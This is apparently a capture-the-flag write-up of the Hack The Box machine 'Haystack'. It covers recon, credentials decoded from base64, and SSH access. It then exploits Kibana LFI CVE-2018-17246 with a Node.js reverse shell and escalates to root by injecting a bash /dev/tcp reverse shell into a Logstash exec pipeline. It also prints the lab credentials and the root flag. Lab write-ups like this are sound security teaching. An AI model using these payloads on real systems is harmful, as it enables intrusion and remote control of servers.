# Haystack

STATUS: **closed** <br>
TARGET IP: **10.10.10.115**

## Information gathering
### NMAP
```sh
➜  ~ sudo nmap -T4 -sS -Pn -sC -sV 10.10.10.115
Password:
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-02 09:43 CEST
Nmap scan report for 10.10.10.115
Host is up (0.027s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 2a:8d:e2:92:8b:14:b6:3f:e4:2f:3a:47:43:23:8b:2b (RSA)
|   256 e7:5a:3a:97:8e:8e:72:87:69:a3:0d:d1:00:bc:1f:09 (ECDSA)
|_  256 01:d2:59:b2:66:0a:97:49:20:5f:1c:84:eb:81:ed:95 (ED25519)
80/tcp   open  http    nginx 1.12.2
|_http-server-header: nginx/1.12.2
|_http-title: Site doesnt have a title (text/html).
9200/tcp open  http    nginx 1.12.2
| http-methods:
|_  Potentially risky methods: DELETE
|_http-server-header: nginx/1.12.2
|_http-title: Site doesnt have a title (application/json; charset=UTF-8).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.46 seconds
```

### Site image
Visit  http://10.10.10.115/ there is an image, downloading it we have `needle.jpg`.

Try to analyze image content (install and using exiftool) running the following command
```sh
➜  ~ exiftool -htmldump -w tmp/%f_%e.html needle.jpg
```
open dump file generated [`needle_jpg.html`](https://github.com/lorenzodisidoro/hack-in-the-box/blob/master/machine/haystack/HTML%20Dump%20(needle.jpg).pdf) I had seen a base64 payload `bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg==` and its decoding is `la aguja en el pajar es "clave"`.

### Elasticsearch
So, I try to use Elasticsearch `_search` method ([DOC](https://www.elastic.co/guide/en/elasticsearch/reference/current/search-search.html))
 
http://10.10.10.115:9200/_search?q=clave

```json
{
  "took": 77,
  "timed_out": false,
  "_shards": {
    "total": 11,
    "successful": 11,
    "skipped": 0,
    "failed": 0
  },
  "hits": {
    "total": 2,
    "max_score": 5.9335938,
    "hits": [
      {
        "_index": "quotes",
        "_type": "quote",
        "_id": "45",
        "_score": 5.9335938,
        "_source": {
          "quote": "Tengo que guardar la clave para la maquina: dXNlcjogc2VjdXJpdHkg "
        }
      },
      {
        "_index": "quotes",
        "_type": "quote",
        "_id": "111",
        "_score": 5.3459888,
        "_source": {
          "quote": "Esta clave no se puede perder, la guardo aca: cGFzczogc3BhbmlzaC5pcy5rZXk="
        }
      }
    ]
  }
}
```

## Vulnerability analysis and penetration test
### SSH
Base64 decoding of `dXNlcjogc2VjdXJpdHkg` is **"user: security"** and of `cGFzczogc3BhbmlzaC5pcy5rZXk=` is **"pass: spanish.is.key"**.
I am logged in via SSH with user `security` and password `spanish.is.key` 🥁
```sh
➜  ~ ssh security@10.10.10.115
security@10.10.10.115 password:
Last login: Wed Oct  2 18:48:43 2019 from 10.10.14.0
[security@haystack ~]$
```

Elasticsearch was running on port `9200`, Kibana was running on port `5601`

```sh
[security@haystack tmp]$ ss -tulpn
Netid  State      Recv-Q Send-Q        Local Address:Port    Peer Address:Port
udp    UNCONN     0      0                 127.0.0.1:323     *:*
udp    UNCONN     0      0                       ::1:323     :::*
tcp    LISTEN     0      128                       *:80      *:*
tcp    LISTEN     0      128                       *:9200    *:*
tcp    LISTEN     0      128                       *:22      *:*
tcp    LISTEN     0      128               127.0.0.1:5601    *:*
tcp    LISTEN     0      128        ::ffff:127.0.0.1:9000    :::*
tcp    LISTEN     0      128                      :::80      :::*
tcp    LISTEN     0      128        ::ffff:127.0.0.1:9300    :::*
tcp    LISTEN     0      128                      :::22      :::*
tcp    LISTEN     0      50         ::ffff:127.0.0.1:9600    :::*
``` 

```sh
[security@haystack ~]$ curl http://127.0.0.1:5601
<script>var hashRoute = '/app/kibana';
var defaultRoute = '/app/kibana';

var hash = window.location.hash;
if (hash.length) {
  window.location = hashRoute + hash;
} else {
  window.location = defaultRoute;
```

### CVE-2018-17246
Try vulnerability **CVE-2018-17246 - Kibana LFI < 6.4.3 & 5.6.13** (ref. [link](https://www.elastic.co/blog/kibana-local-file-inclusion-flaw-cve-2018-17246)), there are many directories where `root` is owner and we can write, eg.:
```sh
[security@haystack /]$ ls -la | grep tmp
drwxrwxrwt.  15 root root 4096 11 ott 05.56 tmp
[security@haystack /]$ ls -la /dev | grep shm
drwxrwxrwt.  3 root root         120 11 ott 05.34 shm
```

create javascript revers shell script into `/dev/shm` folder
```js
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(8000, "<MY_UTUN_IP>", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();
```
run `ifconfig` locally and copy `utun` IP.

Locally open netcat connection
```sh
➜  ~ ncat -lvp 8000
```

now run `curl http://127.0.0.1:5601/api/console/api_server?apis=../../../../../../../../../../../<PATH_TO_REVSHELL_FILE>` as a follow
```sh
curl http://127.0.0.1:5601/api/console/api_server?apis=../../../../../../../../../../../dev/shm/rshell.js
```

In rev. shell locally try to run
```
whoami
kibana
```

### Privilege escalation
Snooping linux process I see this
```sh
... 
--path.settings /etc/logstash
...
```

Using kibana revers shell go on `/etc/logstash`, logstash configs file are owned by `kibana`
```sh
cd /etc/logstash

ls -la

total 52
drwxr-xr-x.  3 root   root    183 jun 18 22:15 .
drwxr-xr-x. 85 root   root   8192 ago 27 04:38 ..
drwxrwxr-x.  2 root   kibana   62 jun 24 08:12 conf.d
-rw-r--r--.  1 root   kibana 1850 nov 28  2018 jvm.options
-rw-r--r--.  1 root   kibana 4466 sep 26  2018 log4j2.properties
-rw-r--r--.  1 root   kibana  342 sep 26  2018 logstash-sample.conf
-rw-r--r--.  1 root   kibana 8192 ene 23  2019 logstash.yml
-rw-r--r--.  1 root   kibana 8164 sep 26  2018 logstash.yml.rpmnew
-rw-r--r--.  1 root   kibana  285 sep 26  2018 pipelines.yml
-rw-------.  1 kibana kibana 1725 dic 10  2018 startup.options
```

and contains
```sh
cat conf.d/*

filter {
	if [type] == "execute" {
		grok {
			match => { "message" => "Ejecutar\s*comando\s*:\s+%{GREEDYDATA:comando}" }
		}
	}
}
input {
	file {
		path => "/opt/kibana/logstash_*"
		start_position => "beginning"
		sincedb_path => "/dev/null"
		stat_interval => "10 second"
		type => "execute"
		mode => "read"
	}
}
output {
	if [type] == "execute" {
		stdout { codec => json }
		exec {
			command => "%{comando} &"
		}
	}
}
```

Now I can use these to start another reverse shell, run locally 
```sh
➜  ~ ncat -lvp 8080
```

and go on `/opt/kibana` using previous revers (user `kibana`) shell create file `logstash_rs` running the following command
```sh
echo "Ejecutar comando: bash -i >& /dev/tcp/<MY_UTUN_IP>/8080 0>&1" > logstash_rs
```

wait a few seconds
```sh
[root@haystack ~] whoami
whoami
root
```

owned root and capturing the flag in
```sh
[root@haystack /] cat /root/root.txt
cat /root/root.txt
3f5f727c38d9f70e1d2ad2ba11059d92
```
